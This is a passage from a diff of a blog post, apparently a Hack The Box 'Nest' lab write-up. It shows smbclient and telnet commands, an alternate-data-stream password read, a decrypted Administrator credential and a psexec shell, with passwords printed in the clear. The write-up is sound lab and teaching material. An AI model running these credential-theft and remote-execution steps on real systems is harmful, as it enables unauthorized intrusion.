+root@kalili:~# smbclient //10.10.10.178/Users -U "c.smith"%"xRxRxPANCAK3SxRxRx" -c 'get "C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA"
+&gt; '
 getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA of size 15 as C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
 </code></pre></div>
-
 <p>The file is not empty anymore and contain the password for the DEBUG mode of the HQK service.</p>
 <div class="highlight"><pre><span></span><code>root@kalili:~# cat C.Smith\\HQK\ Reporting\\Debug\ Mode\ Password.txt\:Password\:\$DATA
 WBQ201953D8w
 </code></pre></div>
-
 <h2>HqkLdap.exe</h2>
 <p>We enumerate the folder more and we found a HqkLdap.exe binary. We download it
 on our system.</p>
-<div class="highlight"><pre><span></span><code>smb: \C.Smith\HQK Reporting\&gt; cd &quot;AD Integration Module
+<div class="highlight"><pre><span></span><code>smb: \C.Smith\HQK Reporting\&gt; cd "AD Integration Module
 smb: \C.Smith\HQK Reporting\AD Integration Module\&gt; dir
   .                                   D        0  Fri Aug  9 08:18:42 2019
   ..                                  D        0  Fri Aug  9 08:18:42 2019
@@ -596,13 +535,12 @@ smb: \C.Smith\HQK Reporting\AD Integration Module\&gt; mget HqkLdap.exe
 Get file HqkLdap.exe? y
 getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (9.9 KiloBytes/sec) (average 9.9 KiloBytes/sec)
 </code></pre></div>
-
 <h2>DEBUG HQK Reporting Service</h2>
 <p>We connect to the service and start the debug mode.</p>
 <div class="highlight"><pre><span></span><code>root@kalili:~# telnet 10.10.10.178 4386
 Trying 10.10.10.178...
 Connected to 10.10.10.178.
-Escape character is &#39;^]&#39;.
+Escape character is '^]'.
 
 HQK Reporting Service V1.2
 
@@ -610,7 +548,6 @@ HQK Reporting Service V1.2
 
 Debug mode enabled. Use the HELP command to view additional commands that are now available
 </code></pre></div>
-
 <p>We list the command to see what's new. The new commands are:
   * SERVICE
   * SESSION
@@ -649,11 +586,10 @@ Current Query Directory: C:\Program Files\HQK\ALL QUERIES
 
 Version: 1.2.0.0
 Server Hostname: HTB-NEST
-Server Process: &quot;C:\Program Files\HQK\HqkSvc.exe&quot;
+Server Process: "C:\Program Files\HQK\HqkSvc.exe"
 Server Running As: Service_HQK
 Initial Query Directory: C:\Program Files\HQK\ALL QUERIES
 </code></pre></div>
-
 <p>We go to the <code>C:\Program Files\HQK\</code> directory.</p>
 <div class="highlight"><pre><span></span><code>&gt;list
 
@@ -668,20 +604,18 @@ QUERY FILES IN CURRENT DIRECTORY
 [2]   HqkSvc.InstallState
 [3]   HQK_Config.xml
 </code></pre></div>
-
 <p>The Showquery function allow use to read the files in the current directory.
 The file HQK_Config.xml contain our debugging password and the port of the
 service.</p>
 <div class="highlight"><pre><span></span><code>&gt;showquery 3
 
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;ServiceSettings xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;
   &lt;Port&gt;4386&lt;/Port&gt;
   &lt;DebugPassword&gt;WBQ201953D8w&lt;/DebugPassword&gt;
   &lt;QueryDirectory&gt;C:\Program Files\HQK\ALL QUERIES&lt;/QueryDirectory&gt;
 &lt;/ServiceSettings&gt;
 </code></pre></div>
-
 <p>We go to the LDAP directory. We found the exe we already got and a configuration
 file. This file contain the Administrator encoded password.</p>
 <div class="highlight"><pre><span></span><code>&gt;setdir ldap
@@ -705,7 +639,6 @@ BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
 User=Administrator
 Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
 </code></pre></div>
-
 <h2>"Reversing" HqkLdap.exe</h2>
 <p>We download the latest release of <a href="https://github.com/0xd4d/dnSpy">dnSpy</a> and
 load the binary. We quickly find some encryption and decryption functions. They
@@ -718,8 +651,8 @@ rerun the code. The only changed line is the following:</p>
 <p><code>Console.WriteLine(Decrypt("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=", "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256))</code></p>
 <p>This give us the administrator password: XtH4nkS4Pl4y1nGX.</p>
 <p>We connect to the "C$" share as administrator and are able to get the root flag.</p>
-<div class="highlight"><pre><span></span><code># smbclient //10.10.10.178/C$ -U &quot;Administrator&quot;%&quot;XtH4nkS4Pl4y1nGX&quot;
-Try &quot;help&quot; to get a list of possible commads.
+<div class="highlight"><pre><span></span><code># smbclient //10.10.10.178/C$ -U "Administrator"%"XtH4nkS4Pl4y1nGX"
+Try "help" to get a list of possible commads.
 smb: \&gt; cd Users\Administrator\
 smb: \Users\Administrator\&gt; cd Desktop\
 smb: \Users\Administrator\Desktop\&gt; ls
@@ -733,7 +666,6 @@ smb: \Users\Administrator\Desktop\&gt; mget root.txt
 Get file root.txt? y
 getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)n
 </code></pre></div>
-
 <p>We can also use psexec to directly execute commands on the system as
 administrator.</p>
 <div class="highlight"><pre><span></span><code>python psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
@@ -756,69 +688,47 @@ C:\&gt;cd Users\Administrator\Desktop
 C:\Users\Administrator\Desktop&gt;type root.txt
 6594c2eb084bc0f08a42f0b94b878c41
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>This box was interesting but a bit ctfish. I learn a few things about NTFS
 alternate data stream and how to get them from a GNU/Linux box.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/vb.html">VB</a>
-      <a href="../../tag/net.html">.NET</a>
-      <a href="../../tag/re.html">RE</a>
-      <a href="../../tag/smb.html">SMB</a>
-      <a href="../../tag/windows.html">Windows</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2020/05/htb-resolute.html" title="HTB: Resolute">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2020/06/htb-monteverde.html" title="HTB: Monteverde">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/vb.html">VB</a>
+<a href="../../tag/net.html">.NET</a>
+<a href="../../tag/re.html">RE</a>
+<a href="../../tag/smb.html">SMB</a>
+<a href="../../tag/windows.html">Windows</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2020/05/htb-resolute.html" title="HTB: Resolute">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2020/06/htb-monteverde.html" title="HTB: Monteverde">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -829,6 +739,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
